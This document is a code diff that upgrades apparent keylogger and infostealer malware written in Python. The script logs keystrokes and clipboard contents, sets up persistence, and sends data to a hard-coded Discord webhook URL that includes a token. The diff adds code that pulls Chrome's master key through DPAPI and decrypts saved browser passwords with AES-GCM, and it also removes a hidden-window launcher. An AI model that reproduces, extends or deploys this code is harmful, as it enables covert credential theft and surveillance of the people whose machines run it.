@@ -10,6 +10,8 @@ import shutil
 import sqlite3
 import ctypes
 import ctypes.wintypes
+import json
+import base64
 from pathlib import Path
 
 # ——— Auto-install Dependencies (per-user, no admin) —————————————————————
@@ -19,7 +21,9 @@ def auto_install_dependencies():
         "pynput": "pynput",
         "pyperclip": "pyperclip",      # clipboard module for clipboard access
         "crontab": "python-crontab",
-        "psutil": "psutil"
+        "psutil": "psutil",
+        "pycryptodome": "pycryptodome",
+        "pywin32": "pywin32"
     }
     for module, pkg in required.items():
         try:
@@ -39,6 +43,8 @@ import requests
 from pynput import keyboard
 import pyperclip
 import psutil
+from Cryptodome.Cipher import AES  # pycryptodome required
+import win32crypt  # pywin32 for Windows DPAPI
 
 # ——— Configuration ——————————————————————————————————————————
 KEY_WEBHOOK    = "https://discord.com/api/webhooks/1374531132959363072/G6SAyrzVq6Ns854CP2uyrTuQaWYbEItcNzDH3aZrfcpbxqo-Q8Fntyacc03yE7trnILj"  # keystrokes channel
@@ -178,38 +184,64 @@ def setup_persistence():
             except:
                 pass
 
-# ——— Chrome Password Grabber ————————————————————————————————————
-def dpapi_decrypt(encrypted_bytes):
-    class DATA_BLOB(ctypes.Structure):
-        _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]
+# ——— Chrome Password Grabber & Decryptor (Improved) ————————————————————
+def get_chrome_master_key():
+    system = platform.system()
+    if system != "Windows":
+        # Currently only implemented for Windows in this script
+        return None
+    local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
+    if not os.path.exists(local_state_path):
+        return None
+    with open(local_state_path, 'r', encoding='utf-8') as f:
+        local_state = json.load(f)
+    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
+    encrypted_key = base64.b64decode(encrypted_key_b64)
+    # Remove DPAPI prefix
+    encrypted_key = encrypted_key[5:]
+    # Decrypt with DPAPI
+    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    return master_key
 
-    CryptUnprotectData = ctypes.windll.crypt32.CryptUnprotectData
-    CryptUnprotectData.argtypes = [ctypes.POINTER(DATA_BLOB), ctypes.POINTER(ctypes.c_wchar_p),
-                                   ctypes.POINTER(DATA_BLOB), ctypes.c_void_p,
-                                   ctypes.c_void_p, ctypes.wintypes.DWORD, ctypes.POINTER(DATA_BLOB)]
-    CryptUnprotectData.restype = ctypes.wintypes.BOOL
+def decrypt_password_windows(encrypted_password, master_key):
+    try:
+        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
+            # AES-GCM encrypted
+            nonce = encrypted_password[3:15]
+            ciphertext = encrypted_password[15:-16]
+            tag = encrypted_password[-16:]
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+            decrypted_pass = cipher.decrypt_and_verify(ciphertext, tag)
+            return decrypted_pass.decode(errors="replace")
+        else:
+            # DPAPI encrypted legacy
+            decrypted_pass = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+            return decrypted_pass.decode(errors="replace")
+    except Exception as e:
+        return f"[Decryption error: {e}]"
 
-    in_blob = DATA_BLOB(len(encrypted_bytes), ctypes.create_string_buffer(encrypted_bytes))
-    out_blob = DATA_BLOB()
-    if CryptUnprotectData(ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)):
-        pointer = out_blob.pbData
-        size = out_blob.cbData
-        decrypted = ctypes.string_at(pointer, size)
-        ctypes.windll.kernel32.LocalFree(pointer)
-        return decrypted
+def get_chrome_login_data_path():
+    system = platform.system()
+    if system == "Windows":
+        user_profile = os.environ.get("USERPROFILE")
+        return Path(user_profile) / r"AppData\Local\Google\Chrome\User Data\Default\Login Data"
+    elif system == "Darwin":
+        return Path.home() / "Library/Application Support/Google/Chrome/Default/Login Data"
+    elif system == "Linux":
+        return Path.home() / ".config/google-chrome/Default/Login Data"
     else:
         return None
 
 def read_chrome_passwords():
-    user_profile = os.environ.get("USERPROFILE")
-    login_data_path = Path(user_profile) / r"AppData\Local\Google\Chrome\User Data\Default\Login Data"
-    temp_copy = Path("./LoginData_copy.db")
-
-    if not login_data_path.exists():
+    login_db_path = get_chrome_login_data_path()
+    if not login_db_path or not login_db_path.exists():
         return None
 
+    master_key = get_chrome_master_key()
+
+    temp_copy = Path("./LoginData_temp.db")
     try:
-        shutil.copy2(login_data_path, temp_copy)
+        shutil.copy2(login_db_path, temp_copy)
         conn = sqlite3.connect(str(temp_copy))
         cursor = conn.cursor()
         cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
@@ -218,11 +250,11 @@ def read_chrome_passwords():
         for origin_url, username, encrypted_password in cursor.fetchall():
             if not username:
                 continue
-            decrypted_password = dpapi_decrypt(encrypted_password)
-            if decrypted_password is None:
-                decrypted_password = b"[Decryption failed]"
+            decrypted_password = None
+            if master_key:
+                decrypted_password = decrypt_password_windows(encrypted_password, master_key)
             else:
-                decrypted_password = decrypted_password.decode(errors="replace")
+                decrypted_password = "[No master key - cannot decrypt]"
             creds.append({
                 "url": origin_url,
                 "username": username,
@@ -230,14 +262,15 @@ def read_chrome_passwords():
             })
         cursor.close()
         conn.close()
-        temp_copy.unlink()
-        return creds
-    except:
+    except Exception:
+        creds = None
+    finally:
         try:
             temp_copy.unlink()
-        except:
+        except Exception:
             pass
-        return None
+
+    return creds
 
 def send_passwords_to_webhook(creds):
     if not creds:
@@ -261,37 +294,15 @@ def run():
     signal.signal(signal.SIGTERM, lambda s, f: stop_evt.set())
     signal.signal(signal.SIGINT,  lambda s, f: stop_evt.set())
 
-    t_keys = threading.Thread(target=key_sender, daemon=True)
-    t_clip = threading.Thread(target=clip_watcher, daemon=True)
-    t_keys.start()
-    t_clip.start()
+    threading.Thread(target=key_sender, daemon=True).start()
+    threading.Thread(target=clip_watcher, daemon=True).start()
 
-    listener = keyboard.Listener(on_press=on_press)
-    listener.daemon = True
-    listener.start()
-
-    stop_evt.wait()
-    listener.stop()
-    data_evt.set()
-    t_keys.join()
-    t_clip.join()
+    with keyboard.Listener(on_press=on_press) as listener:
+        try:
+            listener.join()
+        except KeyboardInterrupt:
+            pass
     cleanup_singleton()
 
-# ——— Launcher (Hidden Subprocess) ——————————————————————————————
-def launcher():
-    system = platform.system()
-    script = os.path.abspath(__file__)
-    if system == "Windows":
-        pythonw = sys.executable.replace("python.exe","pythonw.exe")
-        flags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
-        subprocess.Popen([pythonw, script, "run"], creationflags=flags, close_fds=True)
-    else:
-        subprocess.Popen([sys.executable, script, "run"],
-                         preexec_fn=os.setpgrp, close_fds=True)
-
-# ——— Entry Point ————————————————————————————————————————————
 if __name__ == "__main__":
-    if len(sys.argv) > 1 and sys.argv[1] == "run":
-        run()
-    else:
-        launcher()
+    run()
